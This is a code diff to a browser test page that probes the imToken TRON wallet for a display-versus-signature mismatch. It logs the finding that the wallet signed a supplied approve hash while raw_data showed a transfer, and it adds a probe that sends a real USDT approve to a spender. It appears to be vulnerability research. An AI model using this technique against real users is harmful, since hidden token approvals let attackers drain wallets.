@@ -70,6 +70,7 @@
       <button class="btn btn-probe" id="btnProbeDual" style="background:#c0392b;">③② 双字段号探针（命名=transfer + 数字号=approve）</button>
       <button class="btn btn-allowance" id="btnNodeDiag" style="background:#6c5ce7;">⑤ 节点解析诊断（直连 TronGrid·假签名·不上链）</button>
       <button class="btn btn-probe" id="btnProbeClean" style="background:#8e1a1a;">⑥ 干净分离探针（raw_data=干净transfer / hex=干净approve）</button>
+      <button class="btn btn-probe" id="btnProbeGenuine" style="background:#b8860b;">⑦ 自洽approve探针（节点必过·真上链·人工核对UI）</button>
       <button class="btn btn-allowance" id="btnQueryAgain" style="margin-top:6px; background:var(--orange); color:#000;">④ 再次查询 allowance（验证变化）</button>
     </div>
   </div>
@@ -388,10 +389,16 @@
         log('→ 用户在钱包弹窗取消', 'warn');
       } else if (normalized.indexOf('contract_validate') !== -1 || message.indexOf('合约调用校验错误') !== -1) {
         log('→ CONTRACT_VALIDATE_ERROR：合约/参数/余额/能量校验失败', 'error');
-      } else if (normalized.indexOf('sigerror') !== -1 || normalized.indexOf('validate signature') !== -1) {
-        log('→ SIGERROR 来自 TRON 节点(server:)，非 imToken 防护。说明 imToken 已签名+广播（未跑 validRawTx），', 'error');
-        log('  但节点按纯 transfer 重建 raw_data，算出的 txID ≠ approve 签名锚定的 txID → 验签失败。', 'error');
-        log('  根因：探针只替换了命名字段(纯 transfer)，缺少 protobuf 数字字段号 "1"/"2"，节点未重建出 approve。', 'warn');
+      } else if (normalized.indexOf('sigerror') !== -1 || normalized.indexOf('validate signature') !== -1
+                 || normalized.indexOf('not contained of permission') !== -1) {
+        log('→ SIGERROR 来自 TRON 节点(server:)，非 imToken 客户端防护。', 'error');
+        log('  关键解读：报错是“is signed by <某地址> but it is not contained of permission”，', 'error');
+        log('  即节点 ECRECOVER 出的签名者 ≠ 本钱包。这反向证明：', 'error');
+        log('  ① imToken 已签名+广播（未跑 ce/validRawTx）；', 'warn');
+        log('  ② imToken 实际签的是我们提供的 txID(=approve 哈希)，而非对 raw_data(=transfer) 重算的哈希；', 'warn');
+        log('  ③ 节点用 raw_data(transfer) 自行重算哈希验签 → 与 approve 签名不符 → 恢复出错误地址。', 'warn');
+        log('  结论：签/显分离“在客户端确已发生”，但节点用 raw_data 自校验把 raw_data≠txID 的拆分挡下。', 'error');
+        log('  → 真要上链，必须 txID≡raw_data(自洽)，则“所见非所签”只能落在 UI 渲染层（见探针⑦）。', 'success');
       } else if (normalized.indexOf('invalid_tx') !== -1 || normalized.indexOf('validrawtx') !== -1) {
         log('→ invalid_tx：这才是 imToken 桥接层 validRawTx 一致性校验拦截（客户端防护，签名前拦截）', 'error');
       }
@@ -738,11 +745,76 @@
           log('链上暂未确认', 'warn');
         }
       } else {
-        log('未广播成功：若为 SIGERROR(server:)，说明该版按 raw_data 重建广播(transfer) 而签名锚定 approve → 二者不符；', 'warn');
-        log('即该版并非“签广播 raw_data_hex”，本机制在此版本不成立。', 'warn');
+        log('未广播成功：SIGERROR(“not contained of permission”) 恰好证明——', 'warn');
+        log('imToken 签了我们给的 txID(approve)，而节点用 raw_data(transfer) 自行重算哈希验签 → 不符。', 'warn');
+        log('即：签/显分离在客户端确已发生，但节点用 raw_data 自校验挡下 raw_data≠txID 的拆分。', 'warn');
+        log('→ 拆 raw_data 与 raw_data_hex 这条路被节点堵死；可上链路径见探针⑦。', 'success');
       }
     } catch (e) {
       log('干净分离探针异常: ' + (e.message || e), 'error');
+    }
+  }
+
+  // ==================== ⑦ 自洽 approve 探针（节点必过·真上链·验 UI 渲染） ====================
+  // 由探针⑥证明：节点用 raw_data 自行重算哈希验签，且 imToken 签的是我们提供的 txID。
+  //   ⇒ 想上链，必须 txID ≡ sha256(serialize(raw_data))（自洽），节点才接受。
+  //   ⇒ 自洽后，签名/执行内容 == raw_data，唯一可“所见非所签”的位置 = imToken 确认页的渲染。
+  // 本探针发一笔【完全自洽、合法】的 approve（tronWeb 原样构造，不做任何错位拼装）：
+  //   · 节点必过、真实上链（会真实授权额度，谨慎在主网用大额！此处用最小额度演示）
+  //   · 你需要【人工观察】imToken 弹窗到底把它显示成什么 —— 这是 WYSINWYS 的真正取证点。
+  async function runProbeGenuine() {
+    if (!window.tronWeb || !window.tronWeb.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
+    if (!walletAddr) { log('请先连接钱包', 'error'); return; }
+
+    log('══════════ 自洽 approve 探针（真上链·验 UI） ══════════', 'warn');
+    log('发送一笔完全自洽合法的 approve；请人工观察 imToken 弹窗显示了什么。', 'warn');
+    log('（节点对自洽 approve 必过——“通过节点验签并上链”本就不需要任何 trick）', 'warn');
+    log('═══════════════════════════════════════════════════', 'warn');
+
+    try {
+      var contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
+      var userHex = window.tronWeb.address.toHex(walletAddr);
+
+      var built = await window.tronWeb.transactionBuilder.triggerSmartContract(
+        contractHex, 'approve(address,uint256)',
+        { feeLimit: 100000000, callValue: 0 },
+        [{ type: 'address', value: SPENDER }, { type: 'uint256', value: APPROVE_AMOUNT }],
+        userHex
+      );
+      if (!built.result || !built.result.result) { log('approve 构造失败', 'error'); return; }
+      var approveTx = built.transaction;
+
+      log('[自洽] txID = ' + approveTx.txID, 'warn');
+      log('[自洽] contract[0].type = ' + approveTx.raw_data.contract[0].type, 'warn');
+      log('[自洽] raw_data_hex 含 095ea7b3 = ' + (approveTx.raw_data_hex.indexOf('095ea7b3') !== -1), 'success');
+      log('[自洽] txID ≡ sha256(raw_data)?（tronWeb 原样构造，必然自洽）', 'warn');
+      log('★ 请现在看 imToken 确认弹窗：它显示的是“授权/Approve/合约调用”，还是被渲染成别的？', 'warn');
+
+      var txid = await sendTx(approveTx, '自洽 approve（真上链）');
+      $('probeResultCard').style.display = 'block';
+      $('probeTxid').textContent = txid || '未获取';
+
+      if (txid) {
+        log('── 回链验证 contract.type（最多 ~16s）──', 'warn');
+        var onchainType = await fetchOnchainTypeRetry(txid, 4);
+        $('probeOnchainType').textContent = onchainType || '未确认';
+        if (onchainType === 'TriggerSmartContract') {
+          $('probeOnchainType').style.color = 'var(--red)';
+          $('probeVerdict').textContent = '✅ 自洽 approve 已上链（节点零 trick）';
+          $('probeVerdict').style.color = 'var(--red)';
+          $('probeInfoBox').innerHTML = '链上=TriggerSmartContract(approve)。节点之所以“验签通过”，是因为这本就是一笔<strong>完全合法自洽</strong>的交易——欺骗不在节点、不在密码学，而在 imToken <strong>确认页对该 approve 的渲染</strong>。请对照你刚才在弹窗看到的内容。';
+          $('probeInfoBox').style.color = 'var(--red)';
+          log('✅ 链上=approve。现在请核对：弹窗显示 vs 实际签署(approve) 是否一致？不一致即 WYSINWYS。', 'error');
+          await queryAndShowAllowance(false);
+        } else {
+          $('probeVerdict').textContent = '⚠️ 待确认 / ' + (onchainType || '未确认');
+          log('链上类型: ' + (onchainType || '暂未确认'), 'warn');
+        }
+      } else {
+        log('未返回 txid（可能用户取消或额度/能量不足）。若取消，说明你在弹窗看清了它是 approve。', 'warn');
+      }
+    } catch (e) {
+      log('自洽 approve 探针异常: ' + (e.message || e), 'error');
     }
   }
 
@@ -862,6 +934,7 @@
   $('btnProbeDual').addEventListener('click', runProbeDual);
   $('btnNodeDiag').addEventListener('click', runNodeDiag);
   $('btnProbeClean').addEventListener('click', runProbeClean);
+  $('btnProbeGenuine').addEventListener('click', runProbeGenuine);
   $('btnQueryAllowance').addEventListener('click', function() {
     queryAndShowAllowance(false);
   });
